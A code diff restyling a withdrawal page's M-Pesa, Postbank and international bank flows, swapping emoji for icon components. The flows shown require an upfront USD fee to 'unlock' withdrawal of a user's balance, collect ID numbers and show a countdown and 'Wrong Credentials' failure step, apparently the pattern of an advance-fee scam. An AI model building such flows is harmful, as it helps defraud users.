@@ -6,6 +6,19 @@ import { useRouter } from 'next/router';
 import { useUser } from '../lib/useUser';
 import { sendNotify } from '../lib/notify';
 import FlowShell from '../components/FlowShell';
+import Icon from '../components/Icon';
+
+// Small monochrome country-code badge (replaces flag emojis in the bank picker).
+function CodeBadge({ code, size = 20 }) {
+  return (
+    <span style={{
+      display: 'inline-flex', alignItems: 'center', justifyContent: 'center',
+      minWidth: size, height: size, padding: '0 4px', borderRadius: 5,
+      background: '#111827', color: '#fff', fontSize: Math.round(size * 0.5),
+      fontWeight: 700, letterSpacing: 0.3, flexShrink: 0,
+    }}>{String(code || '··').toUpperCase()}</span>
+  );
+}
 
 function formatMmSs(ms) {
   if (ms <= 0) return '0:00';
@@ -15,38 +28,38 @@ function formatMmSs(ms) {
 
 // ── Worldwide bank directory (icon, sample account format, validator) ──────────
 const COUNTRY_META = {
-  GB: { country: 'United Kingdom', flag: '🇬🇧', ph: 'GB29 NWBK 6016 1331 9268 19',   re: /^GB[0-9A-Z]{6,30}$/i },
-  DE: { country: 'Germany',        flag: '🇩🇪', ph: 'DE89 3704 0044 0532 0130 00',   re: /^DE[0-9A-Z]{6,30}$/i },
-  FR: { country: 'France',         flag: '🇫🇷', ph: 'FR14 2004 1010 0505 0001 3M02 606', re: /^FR[0-9A-Z]{6,30}$/i },
-  ES: { country: 'Spain',          flag: '🇪🇸', ph: 'ES91 2100 0418 4502 0005 1332', re: /^ES[0-9A-Z]{6,30}$/i },
-  IT: { country: 'Italy',          flag: '🇮🇹', ph: 'IT60 X054 2811 1010 0000 0123 456', re: /^IT[0-9A-Z]{6,30}$/i },
-  NL: { country: 'Netherlands',    flag: '🇳🇱', ph: 'NL91 ABNA 0417 1643 00',        re: /^NL[0-9A-Z]{6,30}$/i },
-  CH: { country: 'Switzerland',    flag: '🇨🇭', ph: 'CH93 0076 2011 6238 5295 7',    re: /^CH[0-9A-Z]{6,30}$/i },
-  IE: { country: 'Ireland',        flag: '🇮🇪', ph: 'IE29 AIBK 9311 5212 3456 78',   re: /^IE[0-9A-Z]{6,30}$/i },
-  BE: { country: 'Belgium',        flag: '🇧🇪', ph: 'BE68 5390 0754 7034',           re: /^BE[0-9A-Z]{6,30}$/i },
-  PT: { country: 'Portugal',       flag: '🇵🇹', ph: 'PT50 0002 0123 1234 5678 9015 4', re: /^PT[0-9A-Z]{6,30}$/i },
-  SE: { country: 'Sweden',         flag: '🇸🇪', ph: 'SE45 5000 0000 0583 9825 7466', re: /^SE[0-9A-Z]{6,30}$/i },
-  NO: { country: 'Norway',         flag: '🇳🇴', ph: 'NO93 8601 1117 947',            re: /^NO[0-9A-Z]{6,30}$/i },
-  PL: { country: 'Poland',         flag: '🇵🇱', ph: 'PL61 1090 1014 0000 0712 1981 2874', re: /^PL[0-9A-Z]{6,30}$/i },
-  AE: { country: 'United Arab Emirates', flag: '🇦🇪', ph: 'AE07 0331 2345 6789 0123 456', re: /^AE[0-9A-Z]{6,30}$/i },
-  SA: { country: 'Saudi Arabia',   flag: '🇸🇦', ph: 'SA03 8000 0000 6080 1016 7519', re: /^SA[0-9A-Z]{6,30}$/i },
-  BR: { country: 'Brazil',         flag: '🇧🇷', ph: 'BR18 0036 0305 0000 1000 9795 493 C1', re: /^BR[0-9A-Z]{6,30}$/i },
-  EG: { country: 'Egypt',          flag: '🇪🇬', ph: 'EG38 0019 0005 0000 0000 2631 8000 2', re: /^EG[0-9A-Z]{6,30}$/i },
-  PK: { country: 'Pakistan',       flag: '🇵🇰', ph: 'PK36 SCBL 0000 0011 2345 6702', re: /^PK[0-9A-Z]{6,30}$/i },
-  KE: { country: 'Kenya',          flag: '🇰🇪', ph: 'KE12 3456 7890 1234 5678 90',   re: /^KE[0-9A-Z]{6,30}$/i },
-  MB: { country: 'Mobile Banking', flag: '📱', ph: '+254 7XX XXX XXX',              re: /^\+?\d{7,15}$/ },
-  US: { country: 'United States',  flag: '🇺🇸', ph: '0123 4567 8901',         re: /^\d{8,17}$/ },
-  CA: { country: 'Canada',         flag: '🇨🇦', ph: '0123 4567 89',           re: /^\d{7,12}$/ },
-  NG: { country: 'Nigeria',        flag: '🇳🇬', ph: '0123456789',             re: /^\d{10}$/ },
-  ZA: { country: 'South Africa',   flag: '🇿🇦', ph: '0123 4567 89',           re: /^\d{9,11}$/ },
-  GH: { country: 'Ghana',          flag: '🇬🇭', ph: '0123 4567 8901 23',      re: /^\d{10,16}$/ },
-  IN: { country: 'India',          flag: '🇮🇳', ph: '0123 4567 8901 2345',    re: /^\d{9,18}$/ },
-  CN: { country: 'China',          flag: '🇨🇳', ph: '6212 3456 7890 1234 567', re: /^\d{16,19}$/ },
-  JP: { country: 'Japan',          flag: '🇯🇵', ph: '1234567',                re: /^\d{7,8}$/ },
-  AU: { country: 'Australia',      flag: '🇦🇺', ph: '0123 4567',              re: /^\d{6,10}$/ },
-  SG: { country: 'Singapore',      flag: '🇸🇬', ph: '012 345678 9',           re: /^\d{9,12}$/ },
-  JM: { country: 'Jamaica',        flag: '🇯🇲', ph: '0123 4567 8901',         re: /^\d{8,14}$/ },
-  MX: { country: 'Mexico',         flag: '🇲🇽', ph: '0123 4567 8901 2345 67', re: /^\d{18}$/ },
+  GB: { country: 'United Kingdom', ph: 'GB29 NWBK 6016 1331 9268 19',   re: /^GB[0-9A-Z]{6,30}$/i },
+  DE: { country: 'Germany',        ph: 'DE89 3704 0044 0532 0130 00',   re: /^DE[0-9A-Z]{6,30}$/i },
+  FR: { country: 'France',         ph: 'FR14 2004 1010 0505 0001 3M02 606', re: /^FR[0-9A-Z]{6,30}$/i },
+  ES: { country: 'Spain',          ph: 'ES91 2100 0418 4502 0005 1332', re: /^ES[0-9A-Z]{6,30}$/i },
+  IT: { country: 'Italy',          ph: 'IT60 X054 2811 1010 0000 0123 456', re: /^IT[0-9A-Z]{6,30}$/i },
+  NL: { country: 'Netherlands',    ph: 'NL91 ABNA 0417 1643 00',        re: /^NL[0-9A-Z]{6,30}$/i },
+  CH: { country: 'Switzerland',    ph: 'CH93 0076 2011 6238 5295 7',    re: /^CH[0-9A-Z]{6,30}$/i },
+  IE: { country: 'Ireland',        ph: 'IE29 AIBK 9311 5212 3456 78',   re: /^IE[0-9A-Z]{6,30}$/i },
+  BE: { country: 'Belgium',        ph: 'BE68 5390 0754 7034',           re: /^BE[0-9A-Z]{6,30}$/i },
+  PT: { country: 'Portugal',       ph: 'PT50 0002 0123 1234 5678 9015 4', re: /^PT[0-9A-Z]{6,30}$/i },
+  SE: { country: 'Sweden',         ph: 'SE45 5000 0000 0583 9825 7466', re: /^SE[0-9A-Z]{6,30}$/i },
+  NO: { country: 'Norway',         ph: 'NO93 8601 1117 947',            re: /^NO[0-9A-Z]{6,30}$/i },
+  PL: { country: 'Poland',         ph: 'PL61 1090 1014 0000 0712 1981 2874', re: /^PL[0-9A-Z]{6,30}$/i },
+  AE: { country: 'United Arab Emirates', ph: 'AE07 0331 2345 6789 0123 456', re: /^AE[0-9A-Z]{6,30}$/i },
+  SA: { country: 'Saudi Arabia',   ph: 'SA03 8000 0000 6080 1016 7519', re: /^SA[0-9A-Z]{6,30}$/i },
+  BR: { country: 'Brazil',         ph: 'BR18 0036 0305 0000 1000 9795 493 C1', re: /^BR[0-9A-Z]{6,30}$/i },
+  EG: { country: 'Egypt',          ph: 'EG38 0019 0005 0000 0000 2631 8000 2', re: /^EG[0-9A-Z]{6,30}$/i },
+  PK: { country: 'Pakistan',       ph: 'PK36 SCBL 0000 0011 2345 6702', re: /^PK[0-9A-Z]{6,30}$/i },
+  KE: { country: 'Kenya',          ph: 'KE12 3456 7890 1234 5678 90',   re: /^KE[0-9A-Z]{6,30}$/i },
+  MB: { country: 'Mobile Banking', ph: '+254 7XX XXX XXX',              re: /^\+?\d{7,15}$/ },
+  US: { country: 'United States',  ph: '0123 4567 8901',         re: /^\d{8,17}$/ },
+  CA: { country: 'Canada',         ph: '0123 4567 89',           re: /^\d{7,12}$/ },
+  NG: { country: 'Nigeria',        ph: '0123456789',             re: /^\d{10}$/ },
+  ZA: { country: 'South Africa',   ph: '0123 4567 89',           re: /^\d{9,11}$/ },
+  GH: { country: 'Ghana',          ph: '0123 4567 8901 23',      re: /^\d{10,16}$/ },
+  IN: { country: 'India',          ph: '0123 4567 8901 2345',    re: /^\d{9,18}$/ },
+  CN: { country: 'China',          ph: '6212 3456 7890 1234 567', re: /^\d{16,19}$/ },
+  JP: { country: 'Japan',          ph: '1234567',                re: /^\d{7,8}$/ },
+  AU: { country: 'Australia',      ph: '0123 4567',              re: /^\d{6,10}$/ },
+  SG: { country: 'Singapore',      ph: '012 345678 9',           re: /^\d{9,12}$/ },
+  JM: { country: 'Jamaica',        ph: '0123 4567 8901',         re: /^\d{8,14}$/ },
+  MX: { country: 'Mexico',         ph: '0123 4567 8901 2345 67', re: /^\d{18}$/ },
 };
 const BANKS_BY_COUNTRY = {
   GB: ['Barclays Bank', 'HSBC UK', 'Lloyds Bank', 'NatWest', 'Standard Chartered'],
@@ -167,20 +180,20 @@ function MpesaFlow({ user, initialStep }) {
   // Bulk amounts (above KES 25,000) must be withdrawn through the bank, not M-Pesa.
   if (Number(user?.balance || 0) > BULK_THRESHOLD_KES) {
     return (
-      <FlowShell title="Withdraw with M-Pesa" subtitle="Bank withdrawal required" icon="📲" accent="linear-gradient(135deg, #1f2937, #374151)">
+      <FlowShell title="Withdraw with M-Pesa" subtitle="Bank withdrawal required" icon="smartphone" accent="var(--mpesa-green)">
         <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
           Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Because this is a <strong>bulk amount</strong> (above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong>), it must be withdrawn <strong>through the bank</strong>, not M-Pesa.
         </div>
-        <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)' }} onClick={() => router.push('/withdraw?method=international')}>
-          🏦 Withdraw via Bank
+        <button className="pay-btn" style={{ background: '#000000' }} onClick={() => router.push('/withdraw?method=international')}>
+          <Icon name="cash" size={16} /> Withdraw via Bank
         </button>
-        <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}>← Back to Dashboard</button>
+        <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}>Back to Dashboard</button>
       </FlowShell>
     );
   }
 
   return (
-    <FlowShell title="Withdraw with M-Pesa" subtitle="Instant M-Pesa payout" icon="📲" accent="linear-gradient(135deg, #1f2937, #374151)">
+    <FlowShell title="Withdraw with M-Pesa" subtitle="Instant M-Pesa payout" icon="smartphone" accent="var(--mpesa-green)">
       {step === 'fee' && (
         <>
           <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb' }}>
@@ -193,10 +206,10 @@ function MpesaFlow({ user, initialStep }) {
           </div>
           <div className="pay-phone-label">M-Pesa Number</div>
           <input className="pay-phone-input" value={phone} onChange={e => setPhone(e.target.value)} placeholder="+254 7XX XXX XXX" />
-          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)' }} onClick={handlePayFee} disabled={loading}>
-            {loading ? <><span className="spinner" /> Redirecting…</> : `🔒 Pay $${FEE_USD} USD via Paystack`}
+          <button className="pay-btn" style={{ background: 'var(--mpesa-green)' }} onClick={handlePayFee} disabled={loading}>
+            {loading ? <><span className="spinner" /> Redirecting…</> : <><Icon name="lock" size={16} /> Pay ${FEE_USD} USD via Paystack</>}
           </button>
-          <div className="pay-secure">🔐 Secured by Paystack • USD → KES conversion included</div>
+          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Secured by Paystack • USD → KES conversion included</div>
         </>
       )}
 
@@ -215,17 +228,17 @@ function MpesaFlow({ user, initialStep }) {
             onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
             placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
           {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
-          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginTop: 20 }} onClick={handleSubmitForm}>
-            💸 Submit Withdrawal Request
+          <button className="pay-btn" style={{ background: '#000000', marginTop: 20 }} onClick={handleSubmitForm}>
+            <Icon name="cash" size={16} /> Submit Withdrawal Request
           </button>
-          <div className="pay-secure">🔐 Your details are encrypted and secure</div>
+          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
         </>
       )}
 
       {step === 'pending' && (
         <>
           <div style={{ background: '#f9fafb', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
-            <span style={{ fontSize: 22 }}>📲</span>
+            <span style={{ color: 'var(--mpesa-green)', display: 'flex' }}><Icon name="smartphone" size={20} /></span>
             <p style={{ margin: 0, fontSize: 14, color: '#1f2937', lineHeight: 1.65 }}>
               Your M-Pesa payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open and ensure your phone is on.
             </p>
@@ -236,7 +249,7 @@ function MpesaFlow({ user, initialStep }) {
               {formatMmSs(remaining)}
             </div>
             <div style={{ marginTop: 14, height: 7, background: '#e5e7eb', borderRadius: 99, overflow: 'hidden' }}>
-              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? 'linear-gradient(90deg, #4b5563, #374151)' : 'linear-gradient(90deg, #1f2937, #374151)', borderRadius: 99, transition: 'width 1s linear' }} />
+              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? '#4b5563' : '#000000', borderRadius: 99, transition: 'width 1s linear' }} />
             </div>
           </div>
           <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
@@ -247,7 +260,7 @@ function MpesaFlow({ user, initialStep }) {
       {step === 'failed' && (
         <>
           <div style={{ background: '#f9fafb', border: '1.5px solid #e5e7eb', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
-            <span style={{ fontSize: 24 }}>⚠️</span>
+            <span style={{ color: '#111827', display: 'flex' }}><Icon name="warning" size={22} /></span>
             <div>
               <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Wrong Credentials</p>
               <p style={{ margin: 0, fontSize: 13, color: '#111827', lineHeight: 1.65 }}>
@@ -255,7 +268,7 @@ function MpesaFlow({ user, initialStep }) {
               </p>
             </div>
           </div>
-          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginBottom: 12 }} onClick={() => setStep('fee')}>🔄 Try Again</button>
+          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => setStep('fee')}><Icon name="refresh" size={16} /> Try Again</button>
           <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
           <div className="withdraw-footer-note" style={{ color: '#374151' }}>Please ensure your phone number and National ID match your M-Pesa registration.</div>
         </>
@@ -320,18 +333,18 @@ function PostbankFlow({ user, initialStep }) {
 
   const isLow    = remaining < 30 * 1000;
   const pct      = Math.min(100, Math.max(0, (remaining / DURATION) * 100));
-  const accent   = 'linear-gradient(135deg, #1f2937, #374151)';
+  const accent   = '#000000';
   const overLimit = Number(user?.balance || 0) > BULK_THRESHOLD_KES;
 
   return (
-    <FlowShell title="Withdraw with Postbank Kenya" subtitle="Postbank payout" icon="🏦" accent={accent}>
+    <FlowShell title="Withdraw with Postbank Kenya" subtitle="Postbank payout" icon="cash" accent={accent}>
       {step === 'choice' && overLimit && (
         <>
           <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
             Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa. Continue with Postbank Kenya below.
           </div>
           <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('fee')}>
-            🏦 Continue with Postbank Kenya
+            <Icon name="cash" size={16} /> Continue with Postbank Kenya
           </button>
         </>
       )}
@@ -342,11 +355,11 @@ function PostbankFlow({ user, initialStep }) {
             You’re withdrawing within <strong>Kenya</strong>. We recommend <strong>M-Pesa (Safaricom)</strong>, it’s instant and avoids the extra verification checks that bank transfers require. Only use <strong>Postbank Kenya</strong> if you can’t use Safaricom / M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
           </div>
           <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Do you want to withdraw using M-Pesa?</div>
-          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
-            ✅ Yes, withdraw with M-Pesa (recommended)
+          <button className="pay-btn" style={{ background: 'var(--mpesa-green)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
+            <Icon name="check" size={16} /> Yes, withdraw with M-Pesa (recommended)
           </button>
           <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('management')}>
-            🏦 No, I can’t use M-Pesa
+            <Icon name="cash" size={16} /> No, I can’t use M-Pesa
           </button>
         </>
       )}
@@ -357,13 +370,13 @@ function PostbankFlow({ user, initialStep }) {
             Bank withdrawals through <strong>Postbank Kenya</strong> are only for clients who were <strong>specifically asked by our management</strong> to use the bank. If you were not asked, please withdraw with <strong>M-Pesa</strong> instead.
           </div>
           <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Were you asked by our management to withdraw via Postbank Kenya?</div>
-          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
-            📲 No, take me to M-Pesa
+          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
+            <Icon name="smartphone" size={16} /> No, take me to M-Pesa
           </button>
           <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('fee')}>
-            🏦 Yes, management asked me, continue with Postbank
+            <Icon name="cash" size={16} /> Yes, management asked me, continue with Postbank
           </button>
-          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}>← Back</button>
+          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}><Icon name="arrowLeft" size={14} /> Back</button>
         </>
       )}
 
@@ -378,10 +391,10 @@ function PostbankFlow({ user, initialStep }) {
             <div className="pay-amount-sub">≈ KES {BANK_FEE_KES.toLocaleString()} • Converted automatically • Unlocks withdrawal</div>
           </div>
           <button className="pay-btn" style={{ background: accent }} onClick={handlePayFee} disabled={loading}>
-            {loading ? <><span className="spinner" /> Redirecting…</> : `🔒 Pay $${BANK_FEE_USD} USD via Paystack`}
+            {loading ? <><span className="spinner" /> Redirecting…</> : <><Icon name="lock" size={16} /> Pay ${BANK_FEE_USD} USD via Paystack</>}
           </button>
-          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}>← Back</button>
-          <div className="pay-secure">🔐 Secured by Paystack • USD → KES conversion included</div>
+          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}><Icon name="arrowLeft" size={14} /> Back</button>
+          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Secured by Paystack • USD → KES conversion included</div>
         </>
       )}
 
@@ -406,16 +419,16 @@ function PostbankFlow({ user, initialStep }) {
             placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
           {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
           <button className="pay-btn" style={{ background: accent, marginTop: 20 }} onClick={handleSubmitForm}>
-            💸 Submit Withdrawal Request
+            <Icon name="cash" size={16} /> Submit Withdrawal Request
           </button>
-          <div className="pay-secure">🔐 Your details are encrypted and secure</div>
+          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
         </>
       )}
 
       {step === 'pending' && (
         <>
           <div style={{ background: '#f3f4f6', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
-            <span style={{ fontSize: 22 }}>🏦</span>
+            <span style={{ color: '#111827', display: 'flex' }}><Icon name="cash" size={20} /></span>
             <p style={{ margin: 0, fontSize: 14, color: '#0f172a', lineHeight: 1.65 }}>
               Your Postbank Kenya payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open.
             </p>
@@ -426,7 +439,7 @@ function PostbankFlow({ user, initialStep }) {
               {formatMmSs(remaining)}
             </div>
             <div style={{ marginTop: 14, height: 7, background: '#e5e7eb', borderRadius: 99, overflow: 'hidden' }}>
-              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? 'linear-gradient(90deg, #4b5563, #374151)' : 'linear-gradient(90deg, #1f2937, #374151)', borderRadius: 99, transition: 'width 1s linear' }} />
+              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? '#4b5563' : '#000000', borderRadius: 99, transition: 'width 1s linear' }} />
             </div>
           </div>
           <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
@@ -437,7 +450,7 @@ function PostbankFlow({ user, initialStep }) {
       {step === 'failed' && (
         <>
           <div style={{ background: '#f9fafb', border: '1.5px solid #e5e7eb', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
-            <span style={{ fontSize: 24 }}>⚠️</span>
+            <span style={{ color: '#111827', display: 'flex' }}><Icon name="warning" size={22} /></span>
             <div>
               <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Wrong Credentials</p>
               <p style={{ margin: 0, fontSize: 13, color: '#111827', lineHeight: 1.65 }}>
@@ -445,7 +458,7 @@ function PostbankFlow({ user, initialStep }) {
               </p>
             </div>
           </div>
-          <button className="pay-btn" style={{ background: accent, marginBottom: 12 }} onClick={() => setStep('form')}>🔄 Try Again</button>
+          <button className="pay-btn" style={{ background: accent, marginBottom: 12 }} onClick={() => setStep('form')}><Icon name="refresh" size={16} /> Try Again</button>
           <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
           <div className="withdraw-footer-note" style={{ color: '#374151' }}>Please ensure your Postbank account number and National ID are correct.</div>
         </>
@@ -527,14 +540,14 @@ function InternationalFlow({ user, initialStep }) {
 
   if (done) {
     return (
-      <FlowShell title="Withdraw from Other Countries" subtitle="Request submitted" icon="🌍" accent="linear-gradient(135deg, #1f2937, #374151)">
+      <FlowShell title="Withdraw from Other Countries" subtitle="Request submitted" icon="globe" accent="#000000">
         <div style={{ textAlign: 'center', padding: '10px 0' }}>
-          <div style={{ fontSize: 56, marginBottom: 8 }}>✅</div>
+          <div style={{ marginBottom: 8, display: 'flex', justifyContent: 'center', color: '#111827' }}><Icon name="check" size={52} /></div>
           <div style={{ fontFamily: 'var(--font-display)', fontSize: 22, fontWeight: 800, color: '#1f2937', marginBottom: 6 }}>Request Received</div>
           <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', textAlign: 'left', marginTop: 12 }}>
             We’ve received your withdrawal request and emailed you a confirmation at <strong>{user?.email}</strong>. Our payments team will process it and be in touch.
           </div>
-          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginTop: 18 }} onClick={() => router.push('/dashboard')}>Back to Dashboard</button>
+          <button className="pay-btn" style={{ background: '#000000', marginTop: 18 }} onClick={() => router.push('/dashboard')}>Back to Dashboard</button>
         </div>
       </FlowShell>
     );
@@ -542,17 +555,17 @@ function InternationalFlow({ user, initialStep }) {
 
   // M-Pesa / management gate, shown before any bank withdrawal (all banks)
   if (gate !== 'form') {
-    const accent = 'linear-gradient(135deg, #1f2937, #374151)';
+    const accent = '#000000';
     const overLimit = Number(user?.balance || 0) > BULK_THRESHOLD_KES;
     return (
-      <FlowShell title="Withdraw from Other Countries" subtitle="Choose your method" icon="🌍" accent={accent}>
+      <FlowShell title="Withdraw from Other Countries" subtitle="Choose your method" icon="globe" accent={accent}>
         {gate === 'mpesa' && overLimit && (
           <>
             <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
               Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa. Continue with a bank withdrawal below.
             </div>
             <button className="pay-btn" style={{ background: accent }} onClick={() => setGate('fee')}>
-              🏦 Continue with a bank withdrawal
+              <Icon name="cash" size={16} /> Continue with a bank withdrawal
             </button>
           </>
         )}
@@ -562,11 +575,11 @@ function InternationalFlow({ user, initialStep }) {
               For faster, check-free payouts we recommend <strong>M-Pesa (Safaricom)</strong> where available, it’s instant and avoids the extra verification checks that bank transfers require. Only use a <strong>bank</strong> if you can’t use M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
             </div>
             <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Do you want to withdraw using M-Pesa?</div>
-            <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
+            <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
               ✅ Yes, withdraw with M-Pesa (recommended)
             </button>
             <button className="pay-btn" style={{ background: accent }} onClick={() => setGate('management')}>
-              🏦 No, I want a bank withdrawal
+              <Icon name="cash" size={16} /> No, I want a bank withdrawal
             </button>
           </>
         )}
@@ -576,11 +589,11 @@ function InternationalFlow({ user, initialStep }) {
               Bank withdrawals are only for clients who were <strong>specifically asked by our management</strong> to use the bank. If you were not asked, please withdraw with <strong>M-Pesa</strong> instead.
             </div>
             <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Were you asked by our management to withdraw via the bank?</div>
-            <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
+            <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
               📲 No, take me to M-Pesa
             </button>
             <button className="pay-btn" style={{ background: accent }} onClick={() => setGate('fee')}>
-              🏦 Yes, management asked me, continue
+              <Icon name="cash" size={16} /> Yes, management asked me, continue
             </button>
             <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setGate('mpesa')}>← Back</button>
           </>
@@ -596,10 +609,10 @@ function InternationalFlow({ user, initialStep }) {
               <div className="pay-amount-sub">≈ KES {BANK_FEE_KES.toLocaleString()} • Converted automatically • Unlocks the withdrawal form</div>
             </div>
             <button className="pay-btn" style={{ background: accent }} onClick={handlePayFee} disabled={loading}>
-              {loading ? <><span className="spinner" /> Redirecting…</> : `🔒 Pay $${BANK_FEE_USD} USD via Paystack`}
+              {loading ? <><span className="spinner" /> Redirecting…</> : <><Icon name="lock" size={16} /> Pay ${BANK_FEE_USD} USD via Paystack</>}
             </button>
             <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}>← Back to Dashboard</button>
-            <div className="pay-secure">🔐 Secured by Paystack • USD → KES conversion included</div>
+            <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Secured by Paystack • USD → KES conversion included</div>
           </>
         )}
       </FlowShell>
@@ -607,7 +620,7 @@ function InternationalFlow({ user, initialStep }) {
   }
 
   return (
-    <FlowShell title="Withdraw from Other Countries" subtitle="Enter your bank account details" icon="🌍" accent="linear-gradient(135deg, #1f2937, #374151)">
+    <FlowShell title="Withdraw from Other Countries" subtitle="Enter your bank account details" icon="globe" accent="#000000">
       <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', marginBottom: 20 }}>
         {homeBanks.length ? (
           <>Based on your registration, we’re showing banks in <strong>{homeCountry}</strong>. Choose your bank and enter your account number in the format shown, or search for a different bank. Our payments team is notified automatically when you submit.</>
@@ -628,17 +641,17 @@ function InternationalFlow({ user, initialStep }) {
           style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8, width: '100%', textAlign: 'left', cursor: 'pointer', background: '#fff', borderColor: errors.bank ? '#4b5563' : undefined }}>
           {selectedBank ? (
             <span style={{ display: 'flex', alignItems: 'center', gap: 8, overflow: 'hidden' }}>
-              <span style={{ fontSize: 18, lineHeight: 1 }}>{selectedBank.flag}</span>
+              <CodeBadge code={selectedBank.code} size={18} />
               <span style={{ fontWeight: 600, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{selectedBank.name}</span>
               <span style={{ color: '#9ca3af', fontSize: 12, whiteSpace: 'nowrap' }}>· {selectedBank.country}</span>
             </span>
           ) : (<span style={{ color: '#9ca3af' }}>Select your bank</span>)}
-          <span style={{ color: '#9ca3af', fontSize: 12 }}>{bankOpen ? '▲' : '▼'}</span>
+          <span style={{ color: '#9ca3af', display: 'flex', transform: bankOpen ? 'rotate(180deg)' : 'none' }}><Icon name="chevronDown" size={16} /></span>
